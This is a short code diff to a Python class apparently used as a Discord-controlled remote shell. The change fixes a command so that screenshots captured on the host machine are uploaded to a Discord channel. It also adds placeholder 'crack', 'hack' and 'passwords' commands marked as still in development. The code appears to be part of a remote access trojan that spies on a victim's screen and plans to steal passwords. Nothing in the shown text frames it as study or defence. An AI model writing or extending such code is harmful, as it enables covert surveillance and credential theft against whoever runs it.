@@ -40,7 +40,9 @@ class DCShell:
             await message.reply("**Welcome to the FTP+ shell!**\n> `help` for a list of commands")
         elif cmd[0] in ["screen", "view", "ss", "screenshare", "screenshot"]:
             imgPath = get_screenshot()
-            await message.reply("Screenshot was **successfully** taken:", file=imgPath)
+            await message.reply("Screenshot was **successfully** taken:", file=discord.File(imgPath))
+        elif cmd[0] in ["crack", "hack", "passwords", "passwordlist"]:
+            await message.reply("Sorry, this command is **still in development**...")
         elif cmd[0] in ["kill", "stop"]:
             await message.reply("**Killing** this shell...")
             exit()
